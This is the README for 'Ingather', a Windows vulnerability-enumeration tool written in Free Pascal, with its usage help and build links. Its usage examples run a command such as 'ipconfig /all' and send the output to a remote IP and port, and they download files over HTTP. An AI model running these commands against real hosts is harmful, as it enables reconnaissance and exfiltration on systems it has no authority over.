# Ingather

Windows vulnerability command line enumeration tool.  Written in Free Pascal/Lazarus: http://www.lazarus-ide.org/index.php?page=downloads.

```
Usage: Ingather.exe --enum -i 1.1.1.1 -p 4444 -o output.txt
       Ingather.exe --download http://www.abcded.com/abc.txt --save c:\temp\abc.text
       Ingather.exe -c "ipconfig /all" -i 1.1.1.1 -p 4444

Download file over HTTP:
       -d --download    : download file
       -s --save        : location to save downloaded file to
       -z               : use the Windows HTTP download function
                          otherwise use custom HTTP download function
Enumerate vulnerabilities:
       -e --enum        : enumerate host vulnerabilities
Output options:
       -c --command     : run command and send output across network
                          must be used with -i and -p
       -h --help        : print this help message
       -i --ip          : destination IP address
       -p --port        : destination port
       -o --out         : write enumeration command outputs to file
```

Reduce Lazarus EXE file size: http://lazplanet.blogspot.com/2013/03/how-to-reduce-exe-file-size-of-your.html

Synapse Lazarus TCP package:  http://www.ararat.cz/synapse/doku.php/download; Install: http://wiki.freepascal.org/Synapse#Installation

DISCLAIMER:
This program is for educational use and/or vulnerability enumeration by cyber security professionals only.  All responsability and negative consequences for its use falls entirely on the one executing it.
